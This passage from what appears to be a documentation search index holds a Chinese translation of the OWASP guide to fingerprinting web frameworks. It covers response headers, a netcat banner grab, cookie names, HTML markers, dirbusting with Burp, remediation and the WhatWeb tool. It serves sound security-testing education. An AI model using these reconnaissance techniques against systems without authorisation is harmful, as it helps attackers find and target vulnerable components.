\u5e94\u7528\u7a0b\u5e8f\u90fd\u5df2\u7ecf\u5f00\u53d1\u51fa\u6765\u4e86\u3002\u968f\u7740\u4e16\u754c\u5404\u5730\u79ef\u6781\u5f00\u53d1\u548c\u90e8\u7f72\u7684\u5927\u91cf\u514d\u8d39\u548c\u5f00\u6e90\u8f6f\u4ef6\u9879\u76ee\uff0c\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5\u5f88\u53ef\u80fd\u4f1a\u9762\u4e34\u4e00\u4e2a\u5b8c\u5168\u6216\u90e8\u5206\u4f9d\u8d56\u4e8e\u8fd9\u4e9b\u4f17\u6240\u5468\u77e5\u7684\u5e94\u7528\u7a0b\u5e8f\u6216\u6846\u67b6\uff08\u4f8b\u5982 WordPress \u3001phpBB\u3001Mediawiki \u7b49\uff09\u3002\u4e86\u89e3\u6b63\u5728\u6d4b\u8bd5\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u7ec4\u4ef6\u5bf9\u6d4b\u8bd5\u8fc7\u7a0b\u6709\u5f88\u5927\u5e2e\u200b\u200b\u52a9\uff0c\u4e5f\u5c06\u5927\u5927\u51cf\u5c11\u6d4b\u8bd5\u671f\u95f4\u6240\u9700\u7684\u5de5\u4f5c\u91cf\u3002\u8fd9\u4e9b\u4f17\u6240\u5468\u77e5\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u5177\u6709\u4f17\u6240\u5468\u77e5\u7684 HTML \u6807\u5934\u3001cookie \u548c\u76ee\u5f55\u7ed3\u6784\uff0c\u53ef\u4ee5\u901a\u8fc7\u679a\u4e3e\u6765\u8bc6\u522b\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u3002\u5927\u591a\u6570 Web \u6846\u67b6\u5728\u8fd9\u4e9b\u4f4d\u7f6e\u90fd\u6709\u51e0\u4e2a\u6807\u8bb0\uff0c\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u6216\u6d4b\u8bd5\u8005\u8bc6\u522b\u5b83\u4eec\u3002\u8fd9\u57fa\u672c\u4e0a\u662f\u6240\u6709\u81ea\u52a8\u5de5\u5177\u6240\u505a\u7684\uff0c\u5b83\u4eec\u4ece\u9884\u5b9a\u4e49\u7684\u4f4d\u7f6e\u5bfb\u627e\u6807\u8bb0\uff0c\u7136\u540e\u5c06\u5176\u4e0e\u5df2\u77e5\u7b7e\u540d\u7684\u6570\u636e\u5e93\u8fdb\u884c\u6bd4\u8f83\u3002\u4e3a\u4e86\u83b7\u5f97\u66f4\u597d\u7684\u51c6\u786e\u6027\uff0c\u901a\u5e38\u4f7f\u7528\u591a\u4e2a\u6807\u8bb0\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_53","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u5bf9 Web \u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684\u7ec4\u4ef6\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_54","title":"\u5982\u4f55\u6d4b\u8bd5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_55","title":"\u9ed1\u76d2\u6d4b\u8bd5","text":"<p>\u4e3a\u4e86\u8bc6\u522b\u6846\u67b6\u6216\u7ec4\u4ef6\uff0c\u9700\u8981\u8003\u8651\u51e0\u4e2a\u5e38\u89c1\u7684\u4f4d\u7f6e\uff1a</p> <ul> <li>HTTP \u6807\u5934</li> <li>\u997c\u5e72</li> <li>\u7f51\u9875\u6e90\u4ee3\u7801</li> <li>\u7279\u5b9a\u6587\u4ef6\u548c\u6587\u4ef6\u5939</li> <li>\u6587\u4ef6\u6269\u5c55\u540d</li> <li>\u9519\u8bef\u8baf\u606f</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#http","title":"HTTP \u6807\u5934","text":"<p>\u8bc6\u522b Web \u6846\u67b6\u7684\u6700\u57fa\u672c\u5f62\u5f0f\u662f\u67e5\u770b<code>X-Powered-By</code>HTTP \u54cd\u5e94\u6807\u5934\u4e2d\u7684\u5b57\u6bb5\u3002\u8bb8\u591a\u5de5\u5177\u90fd\u53ef\u4ee5\u7528\u6765\u5bf9\u76ee\u6807\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u6700\u7b80\u5355\u7684\u662fnetcat\u3002</p> <p>\u8003\u8651\u4ee5\u4e0b HTTP \u8bf7\u6c42-\u54cd\u5e94\uff1a</p> <pre><code>$ nc 127.0.0.1 80\nHEAD / HTTP/1.0\n\nHTTP/1.1 200 OK\nServer: nginx/1.0.14\n[...]\nX-Powered-By: Mono\n</code></pre> <p>\u4ece<code>X-Powered-By</code>\u73b0\u573a\uff0c\u6211\u4eec\u4e86\u89e3\u5230 Web \u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5f88\u53ef\u80fd\u662f<code>Mono</code>.\u00a0\u7136\u800c\uff0c\u867d\u7136\u8fd9\u79cd\u65b9\u6cd5\u7b80\u5355\u5feb\u6377\uff0c\u4f46\u8fd9\u79cd\u65b9\u6cd5\u5e76\u4e0d\u662f\u5728 100% \u7684\u60c5\u51b5\u4e0b\u90fd\u6709\u6548\u3002<code>X-Powered-By</code>\u53ef\u4ee5\u901a\u8fc7\u9002\u5f53\u7684\u914d\u7f6e\u8f7b\u677e\u7981\u7528\u6807\u5934\u3002\u8fd8\u6709\u51e0\u79cd\u6280\u672f\u53ef\u4ee5\u8ba9\u7f51\u7ad9\u6df7\u6dc6 HTTP \u6807\u5934\uff08\u8bf7\u53c2\u9605\u4fee\u590d\u90e8\u5206\u4e2d\u7684\u793a\u4f8b\uff09\u3002<code>nginx</code>\u5728\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u6ce8\u610f\u5230\u6b63\u5728\u4f7f\u7528\u7684\u7279\u5b9a\u7248\u672c\u6765\u63d0\u4f9b\u5185\u5bb9\u3002</p> <p>\u56e0\u6b64\uff0c\u5728\u540c\u4e00\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u9519\u8fc7<code>X-Powered-By</code>\u6807\u5934\u6216\u83b7\u5f97\u5982\u4e0b\u6240\u793a\u7684\u7b54\u6848\uff1a</p> <pre><code>HTTP/1.1 200 OK\nServer: nginx/1.0.14\nDate: Sat, 07 Sep 2013 08:19:15 GMT\nContent-Type: text/html;charset=ISO-8859-1\nConnection: close\nVary: Accept-Encoding\nX-Powered-By: Blood, sweat and tears\n</code></pre> <p>\u6709\u65f6\u4f1a\u6709\u66f4\u591a\u7684 HTTP \u6807\u5934\u6307\u5411\u67d0\u4e2a\u6846\u67b6\u3002\u5728\u4e0b\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6839\u636e HTTP \u8bf7\u6c42\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u770b\u5230<code>X-Powered-By</code>header \u4e2d\u5305\u542b PHP \u7248\u672c\u3002\u7136\u800c\uff0c<code>X-Generator</code>\u6807\u5934\u6307\u51fa\u4f7f\u7528\u7684\u6846\u67b6\u5b9e\u9645\u4e0a\u662f<code>Swiftlet</code>\uff0c\u8fd9\u6709\u52a9\u4e8e\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u6269\u5c55\u4ed6\u4eec\u7684\u653b\u51fb\u5411\u91cf\u3002\u6267\u884c\u6307\u7eb9\u8bc6\u522b\u65f6\uff0c\u8bf7\u4ed4\u7ec6\u68c0\u67e5\u6bcf\u4e2a HTTP \u6807\u5934\u662f\u5426\u5b58\u5728\u6b64\u7c7b\u6cc4\u6f0f\u3002</p> <pre><code>HTTP/1.1 200 OK\nServer: nginx/1.4.1\nDate: Sat, 07 Sep 2013 09:22:52 GMT\nContent-Type: text/html\nConnection: keep-alive\nVary: Accept-Encoding\nX-Powered-By: PHP/5.4.16-1~dotdeb.1\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nX-Generator: Swiftlet\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#cookie","title":"Cookie","text":"<p>\u786e\u5b9a\u5f53\u524d Web \u6846\u67b6\u7684\u53e6\u4e00\u79cd\u7c7b\u4f3c\u4e14\u66f4\u53ef\u9760\u7684\u65b9\u6cd5\u662f\u7279\u5b9a\u4e8e\u6846\u67b6\u7684 cookie\u3002</p> <p>\u8003\u8651\u4ee5\u4e0b HTTP \u8bf7\u6c42\uff1a</p> <p> \u56fe 4.1.8-7\uff1aCakephp HTTP \u8bf7\u6c42</p> <p>cookie<code>CAKEPHP</code>\u5df2\u81ea\u52a8\u8bbe\u7f6e\uff0c\u5b83\u63d0\u4f9b\u6709\u5173\u6b63\u5728\u4f7f\u7528\u7684\u6846\u67b6\u7684\u4fe1\u606f\u3002Cookie\u90e8\u5206\u5217\u51fa\u4e86\u5e38\u89c1\u7684 cookie \u540d\u79f0\u3002\u4f9d\u8d56\u8fd9\u79cd\u8bc6\u522b\u673a\u5236\u4ecd\u7136\u5b58\u5728\u5c40\u9650\u6027\u2014\u2014\u53ef\u4ee5\u66f4\u6539 cookie \u7684\u540d\u79f0\u3002\u4f8b\u5982\uff0c\u5bf9\u4e8e\u9009\u5b9a\u7684<code>CakePHP</code>\u6846\u67b6\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u914d\u7f6e\u5b8c\u6210\uff08\u6458\u81ea<code>core.php</code>\uff09\uff1a</p> <pre><code>/**\n* The name of CakePHP's session cookie.\n*\n* Note the guidelines for Session names states: \"The session name references\n* the session id in cookies and URLs. It should contain only alphanumeric\n* characters.\"\n* @link http://php.net/session_name\n*/\nConfigure::write('Session.cookie', 'CAKEPHP');\n</code></pre> <p>\u4f46\u662f\uff0c\u4e0e\u6807\u5934\u7684\u66f4\u6539\u76f8\u6bd4\uff0c\u8fdb\u884c\u8fd9\u4e9b\u66f4\u6539\u7684\u53ef\u80fd\u6027\u8f83\u5c0f<code>X-Powered-By</code>\uff0c\u56e0\u6b64\u53ef\u4ee5\u8ba4\u4e3a\u8fd9\u79cd\u8bc6\u522b\u65b9\u6cd5\u66f4\u53ef\u9760\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#html","title":"HTML \u6e90\u4ee3\u7801","text":"<p>\u6b64\u6280\u672f\u57fa\u4e8e\u5728 HTML \u9875\u9762\u6e90\u4ee3\u7801\u4e2d\u67e5\u627e\u67d0\u4e9b\u6a21\u5f0f\u3002\u4eba\u4eec\u901a\u5e38\u53ef\u4ee5\u627e\u5230\u5f88\u591a\u4fe1\u606f\u6765\u5e2e\u52a9\u6d4b\u8bd5\u4eba\u5458\u8bc6\u522b\u7279\u5b9a\u7ec4\u4ef6\u3002\u4e00\u79cd\u5e38\u89c1\u7684\u6807\u8bb0\u662f\u76f4\u63a5\u5bfc\u81f4\u6846\u67b6\u6cc4\u9732\u7684 HTML \u6ce8\u91ca\u3002\u901a\u5e38\u53ef\u4ee5\u627e\u5230\u67d0\u4e9b\u7279\u5b9a\u4e8e\u6846\u67b6\u7684\u8def\u5f84\uff0c\u5373\u6307\u5411\u7279\u5b9a\u4e8e\u6846\u67b6\u7684 CSS \u6216 JS \u6587\u4ef6\u5939\u7684\u94fe\u63a5\u3002\u6700\u540e\uff0c\u7279\u5b9a\u7684\u811a\u672c\u53d8\u91cf\u4e5f\u53ef\u80fd\u6307\u5411\u67d0\u4e2a\u6846\u67b6\u3002</p> <p>\u4ece\u4e0b\u9762\u7684\u5c4f\u5e55\u622a\u56fe\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u63d0\u5230\u7684\u6807\u8bb0\u8f7b\u677e\u4e86\u89e3\u4f7f\u7528\u7684\u6846\u67b6\u53ca\u5176\u7248\u672c\u3002\u6ce8\u91ca\u3001\u5177\u4f53\u8def\u5f84\u548c\u811a\u672c\u53d8\u91cf\u90fd\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u5feb\u901f\u786e\u5b9aZK\u6846\u67b6\u7684\u5b9e\u4f8b\u3002</p> <p> \u56fe 4.1.8-2\uff1aZK \u6846\u67b6 HTML \u6e90\u4ee3\u7801\u793a\u4f8b</p> <p>\u6b64\u7c7b\u4fe1\u606f\u901a\u5e38\u4f4d\u4e8e<code>&lt;head&gt;</code>HTTP \u54cd\u5e94\u90e8\u5206\u3001<code>&lt;meta&gt;</code>\u6807\u8bb0\u4e2d\u6216\u9875\u9762\u672b\u5c3e\u3002\u7136\u800c\uff0c\u5e94\u8be5\u5206\u6790\u6574\u4e2a\u54cd\u5e94\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u7528\u4e8e\u5176\u4ed6\u76ee\u7684\uff0c\u4f8b\u5982\u68c0\u67e5\u5176\u4ed6\u6709\u7528\u7684\u8bc4\u8bba\u548c\u9690\u85cf\u5b57\u6bb5\u3002\u6709\u65f6\uff0cWeb \u5f00\u53d1\u4eba\u5458\u4e0d\u592a\u5173\u5fc3\u9690\u85cf\u6709\u5173\u6240\u7528\u6846\u67b6\u6216\u7ec4\u4ef6\u7684\u4fe1\u606f\u3002\u4ecd\u7136\u6709\u53ef\u80fd\u5728\u9875\u9762\u5e95\u90e8\u5076\u7136\u53d1\u73b0\u7c7b\u4f3c\u8fd9\u6837\u7684\u5185\u5bb9\uff1a</p> <p> \u56fe 4.1.8-3\uff1aBanshee \u5e95\u90e8\u9875\u9762</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_56","title":"\u7279\u5b9a\u6587\u4ef6\u548c\u6587\u4ef6\u5939","text":"<p>\u8fd8\u6709\u53e6\u4e00\u79cd\u65b9\u6cd5\u53ef\u4ee5\u6781\u5927\u5730\u5e2e\u52a9\u653b\u51fb\u8005\u6216\u6d4b\u8bd5\u8005\u9ad8\u7cbe\u5ea6\u5730\u8bc6\u522b\u5e94\u7528\u7a0b\u5e8f\u6216\u7ec4\u4ef6\u3002\u6bcf\u4e2a Web \u7ec4\u4ef6\u5728\u670d\u52a1\u5668\u4e0a\u90fd\u6709\u81ea\u5df1\u7279\u5b9a\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7ed3\u6784\u3002\u5df2\u7ecf\u6ce8\u610f\u5230\uff0c\u53ef\u4ee5\u4ece HTML \u9875\u9762\u6e90\u4ee3\u7801\u4e2d\u770b\u5230\u7279\u5b9a\u8def\u5f84\uff0c\u4f46\u6709\u65f6\u5b83\u4eec\u5e76\u6ca1\u6709\u660e\u786e\u5730\u663e\u793a\u5728\u90a3\u91cc\uff0c\u800c\u662f\u4ecd\u7136\u9a7b\u7559\u5728\u670d\u52a1\u5668\u4e0a\u3002</p> <p>\u4e3a\u4e86\u53d1\u73b0\u5b83\u4eec\uff0c\u4f7f\u7528\u4e86\u4e00\u79cd\u79f0\u4e3a\u5f3a\u5236\u6d4f\u89c8\u6216\u201cdirbusting\u201d\u7684\u6280\u672f\u3002Dirbusting \u662f\u66b4\u529b\u7834\u89e3\u5177\u6709\u5df2\u77e5\u6587\u4ef6\u5939\u548c\u6587\u4ef6\u540d\u7684\u76ee\u6807\uff0c\u5e76\u76d1\u89c6 HTTP \u54cd\u5e94\u4ee5\u679a\u4e3e\u670d\u52a1\u5668\u5185\u5bb9\u3002\u6b64\u4fe1\u606f\u65e2\u53ef\u7528\u4e8e\u67e5\u627e\u9ed8\u8ba4\u6587\u4ef6\u548c\u653b\u51fb\u5b83\u4eec\uff0c\u4e5f\u53ef\u7528\u4e8e\u5bf9 Web \u5e94\u7528\u7a0b\u5e8f\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\u3002Dirbusting \u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u5b8c\u6210\uff0c\u4e0b\u9762\u7684\u793a\u4f8b\u663e\u793a\u4e86\u5728 Burp Suite \u7684\u5b9a\u4e49\u5217\u8868\u548c\u5165\u4fb5\u8005\u529f\u80fd\u7684\u5e2e\u52a9\u4e0b\uff0c\u5bf9 WordPress \u652f\u6301\u7684\u76ee\u6807\u8fdb\u884c\u6210\u529f\u7684 dirbusting \u653b\u51fb\u3002</p> <p> \u56fe 4.1.8-4\uff1a\u4f7f\u7528 Burp \u8fdb\u884c\u5206\u53d1</p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u5bf9\u4e8e\u67d0\u4e9b\u7279\u5b9a\u4e8e WordPress \u7684\u6587\u4ef6\u5939\uff08\u4f8b\u5982\uff0c<code>/wp-includes/</code>\u548c<code>/wp-admin/</code>\uff09 \uff0c\u00a0<code>/wp-content/</code>HTTP \u54cd\u5e94\u5206\u522b\u4e3a 403\uff08\u7981\u6b62\u8bbf\u95ee\uff09\u3001302\uff08\u627e\u5230\uff0c\u91cd\u5b9a\u5411\u5230\u00a0<code>wp-login.php</code>\uff09\u548c 200\uff08\u786e\u5b9a\uff09\u3002\u8fd9\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u6307\u6807\uff0c\u8868\u660e\u76ee\u6807\u662f\u7531 WordPress \u9a71\u52a8\u7684\u3002\u4ee5\u540c\u6837\u7684\u65b9\u5f0f\u53ef\u4ee5 dirbust \u4e0d\u540c\u7684\u5e94\u7528\u7a0b\u5e8f\u63d2\u4ef6\u6587\u4ef6\u5939\u53ca\u5176\u7248\u672c\u3002\u5728\u4e0b\u9762\u7684\u5c4f\u5e55\u622a\u56fe\u4e2d\uff0c\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u5178\u578b\u7684 Drupal \u63d2\u4ef6\u7684 CHANGELOG \u6587\u4ef6\uff0c\u5b83\u63d0\u4f9b\u4e86\u6709\u5173\u6b63\u5728\u4f7f\u7528\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u4fe1\u606f\uff0c\u5e76\u63ed\u793a\u4e86\u4e00\u4e2a\u6613\u53d7\u653b\u51fb\u7684\u63d2\u4ef6\u7248\u672c\u3002</p> <p> \u56fe 4.1.8-5\uff1aDrupal Botcha \u62ab\u9732</p> <p>\u63d0\u793a\uff1a\u5728\u5f00\u59cb dirbusting \u4e4b\u524d\uff0c\u8bf7\u5148\u68c0\u67e5<code>robots.txt</code>\u6587\u4ef6\u3002\u6709\u65f6\u4e5f\u53ef\u4ee5\u5728\u90a3\u91cc\u627e\u5230\u7279\u5b9a\u4e8e\u5e94\u7528\u7a0b\u5e8f\u7684\u6587\u4ef6\u5939\u548c\u5176\u4ed6\u654f\u611f\u4fe1\u606f\u3002<code>robots.txt</code>\u4e0b\u9762\u7684\u5c4f\u5e55\u622a\u56fe\u663e\u793a\u4e86\u6b64\u7c7b\u6587\u4ef6\u7684\u793a\u4f8b\u3002</p> <p> \u56fe 4.1.8-6\uff1a\u673a\u5668\u4eba\u4fe1\u606f\u516c\u5f00</p> <p>\u6bcf\u4e2a\u7279\u5b9a\u5e94\u7528\u7a0b\u5e8f\u7684\u7279\u5b9a\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u90fd\u4e0d\u540c\u3002\u5982\u679c\u786e\u5b9a\u7684\u5e94\u7528\u7a0b\u5e8f\u6216\u7ec4\u4ef6\u662f\u5f00\u6e90\u7684\uff0c\u5219\u5728\u6e17\u900f\u6d4b\u8bd5\u671f\u95f4\u8bbe\u7f6e\u4e34\u65f6\u5b89\u88c5\u53ef\u80fd\u6709\u4ef7\u503c\uff0c\u4ee5\u4fbf\u66f4\u597d\u5730\u4e86\u89e3\u6240\u63d0\u4f9b\u7684\u57fa\u7840\u8bbe\u65bd\u6216\u529f\u80fd\uff0c\u4ee5\u53ca\u670d\u52a1\u5668\u4e0a\u53ef\u80fd\u7559\u4e0b\u7684\u6587\u4ef6\u3002\u4f46\u662f\uff0c\u5df2\u7ecf\u5b58\u5728\u51e0\u4e2a\u4e0d\u9519\u7684\u6587\u4ef6\u5217\u8868\uff1b\u4e00\u4e2a\u5f88\u597d\u7684\u4f8b\u5b50\u662f\u53ef\u9884\u6d4b\u6587\u4ef6/\u6587\u4ef6\u5939\u7684 FuzzDB \u8bcd\u8868\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_57","title":"\u6587\u4ef6\u6269\u5c55\u540d","text":"<p>URL \u53ef\u80fd\u5305\u542b\u6587\u4ef6\u6269\u5c55\u540d\uff0c\u8fd9\u4e5f\u6709\u52a9\u4e8e\u8bc6\u522b\u7f51\u7edc\u5e73\u53f0\u6216\u6280\u672f\u3002</p> <p>\u4f8b\u5982\uff0cOWASP wiki \u4f7f\u7528 PHP\uff1a</p> <pre><code>https://wiki.owasp.org/index.php?title=Fingerprint_Web_Application_Framework&amp;action=edit&amp;section=4\n</code></pre> <p>\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684 Web \u6587\u4ef6\u6269\u5c55\u540d\u548c\u76f8\u5173\u6280\u672f\uff1a</p> <ul> <li><code>.php</code>\u2013 PHP</li> <li><code>.aspx</code>\u2013 \u5fae\u8f6f ASP.NET</li> <li><code>.jsp</code>\u2013 Java \u670d\u52a1\u5668\u9875\u9762</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_58","title":"\u9519\u8bef\u4fe1\u606f","text":"<p>\u5982\u4ee5\u4e0b\u5c4f\u5e55\u622a\u56fe\u6240\u793a\uff0c\u5217\u51fa\u7684\u6587\u4ef6\u7cfb\u7edf\u8def\u5f84\u6307\u5411\u4f7f\u7528 WordPress (\u00a0<code>wp-content</code>)\u3002\u6d4b\u8bd5\u4eba\u5458\u8fd8\u5e94\u8be5\u77e5\u9053 WordPress \u662f\u57fa\u4e8e PHP \u7684 (\u00a0<code>functions.php</code>)\u3002</p> <p> \u56fe 4.1.8-7\uff1aWordPress \u89e3\u6790\u9519\u8bef</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_59","title":"\u901a\u7528\u6807\u8bc6\u7b26","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#cookie_1","title":"Cookie","text":"<p>Framework Cookie name</p> <p>Zope zope3</p> <p>CakePHP cakephp</p> <p>Kohana kohanasession</p> <p>Laravel laravel_session</p> <p>phpBB phpbb3_</p> <p>WordPress wp-settings</p> <p>1C-Bitrix BITRIX_</p> <p>AMPcms AMP</p> <p>Django CMS django</p> <p>DotNetNuke DotNetNukeAnonymous</p> <p>e107 e107_tz</p> <p>EPiServer EPiTrace, EPiServer</p> <p>Graffiti CMS graffitibot</p> <p>Hotaru CMS hotaru_mobile</p> <p>ImpressCMS ICMSession</p> <p>Indico MAKACSESSION</p> <p>InstantCMS InstantCMS[logdate]</p> <p>Kentico CMS CMSPreferredCulture</p> <p>MODx SN4[12symb]</p> <p>TYPO3 fe_typo_user</p> <p>Dynamicweb Dynamicweb</p> <p>LEPTON lep[some_numeric_value]+sessionid</p> <p>Wix Domain=.wix.com</p> <p>VIVVO VivvoSessionId</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#html_1","title":"HTML \u6e90\u4ee3\u7801","text":"<p>\u5e94\u7528</p> <p>\u5173\u952e\u8bcd</p> <p>WordPress\u7684</p> <p><code>&lt;meta name=\"generator\" content=\"WordPress 3.9.2\" /&gt;</code></p> <p>phpBB</p> <p><code>&lt;body id=\"phpbb\"</code></p> <p>Mediawiki</p> <p><code>&lt;meta name=\"generator\" content=\"MediaWiki 1.21.9\" /&gt;</code></p> <p>Joomla</p> <p><code>&lt;meta name=\"generator\" content=\"Joomla! - Open Source Content Management\" /&gt;</code></p> <p>Drupal</p> <p><code>&lt;meta name=\"Generator\" content=\"Drupal 7 (http://drupal.org)\" /&gt;</code></p> <p>DotNetNuke</p> <p><code>DNN Platform - [http://www.dnnsoftware.com](http://www.dnnsoftware.com)</code></p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_60","title":"\u4e00\u822c\u6807\u8bb0","text":"<ul> <li><code>%framework_name%</code></li> <li><code>powered by</code></li> <li><code>built upon</code></li> <li><code>running</code></li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_61","title":"\u7279\u5b9a\u6807\u8bb0","text":"<p>\u6846\u67b6</p> <p>\u5173\u952e\u8bcd</p> <p>Adobe ColdFusion</p> <p><code>&lt;!-- START headerTags.cfm</code></p> <p>Microsoft ASP.NET</p> <p><code>__VIEWSTATE</code></p> <p>ZK</p> <p><code>&lt;!-- ZK</code></p> <p>Business Catalyst</p> <p><code>&lt;!-- BC_OBNW --&gt;</code></p> <p>Indexhibit</p> <p><code>ndxz-studio</code></p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_62","title":"\u6574\u6cbb","text":"<p>\u867d\u7136\u53ef\u4ee5\u52aa\u529b\u4f7f\u7528\u4e0d\u540c\u7684 cookie \u540d\u79f0\uff08\u901a\u8fc7\u66f4\u6539\u914d\u7f6e\uff09\u3001\u9690\u85cf\u6216\u66f4\u6539\u6587\u4ef6/\u76ee\u5f55\u8def\u5f84\uff08\u901a\u8fc7\u91cd\u5199\u6216\u6e90\u4ee3\u7801\u66f4\u6539\uff09\u3001\u5220\u9664\u5df2\u77e5\u6807\u5934\u7b49\uff0c\u4f46\u8fd9\u4e9b\u52aa\u529b\u5f52\u7ed3\u4e3a\u201c\u901a\u8fc7\u6a21\u7cca\u5b9e\u73b0\u5b89\u5168\u201d\u3002\u7cfb\u7edf\u6240\u6709\u8005/\u7ba1\u7406\u5458\u5e94\u8be5\u8ba4\u8bc6\u5230\uff0c\u8fd9\u4e9b\u52aa\u529b\u53ea\u4f1a\u51cf\u6162\u6700\u57fa\u672c\u7684\u5bf9\u624b\u3002\u65f6\u95f4/\u7cbe\u529b\u53ef\u4ee5\u66f4\u597d\u5730\u7528\u4e8e\u5229\u76ca\u76f8\u5173\u8005\u610f\u8bc6\u548c\u89e3\u51b3\u65b9\u6848\u7ef4\u62a4\u6d3b\u52a8\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_63","title":"\u5de5\u5177","text":"<p>\u4e0b\u9762\u5217\u51fa\u4e86\u5e38\u7528\u548c\u4f17\u6240\u5468\u77e5\u7684\u5de5\u5177\u3002\u8fd8\u6709\u5f88\u591a\u5176\u4ed6\u5b9e\u7528\u7a0b\u5e8f\uff0c\u4ee5\u53ca\u57fa\u4e8e\u6846\u67b6\u7684\u6307\u7eb9\u8bc6\u522b\u5de5\u5177\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#whatweb","title":"Whatweb","text":"<p>\u7f51\u7ad9\uff1ahttps ://github.com/urbanadventurer/WhatWeb</p> <p>\u76ee\u524d\u5e02\u573a\u4e0a\u6700\u597d\u7684\u6307\u7eb9\u8bc6\u522b\u5de5\u5177\u4e4b\u4e00\u3002\u5305\u542b\u5728\u9ed8\u8ba4\u7684Kali Linux\u6784\u5efa\u4e2d\u3002\u8bed\u8a00\uff1aRuby \u7528\u4e8e\u6307\u7eb9\u8bc6\u522b\u7684\u5339\u914d\u4f7f\u7528\uff1a</p> <ul> <li>\u6587\u672c\u5b57\u7b26\u4e32\uff08\u533a\u5206\u5927\u5c0f\u5199\uff09</li> <li>\u5e38\u7528\u8868\u8fbe</li> <li>Google Hack \u6570\u636e\u5e93\u67e5\u8be2\uff08\u6709\u9650\u7684\u5173\u952e\u5b57\u96c6\uff09</li> <li>MD5 \u54c8\u5e0c</li> <li>\u7f51\u5740\u8bc6\u522b</li> <li>HTML \u6807\u8bb0\u6a21\u5f0f</li> <li>\u7528\u4e8e\u88ab\u52a8\u548c\u4e3b\u52a8\u64cd\u4f5c\u7684\u81ea\u5b9a\u4e49 ruby\u200b\u200b \u4ee3\u7801</li> </ul> <p>\u793a\u4f8b\u8f93\u51fa\u663e\u793a\u5728\u4e0b\u9762\u7684\u5c4f\u5e55\u622a\u56fe\u4e2d\uff1a</p> <p> \u56fe 4.1.8-8\uff1aWhatweb 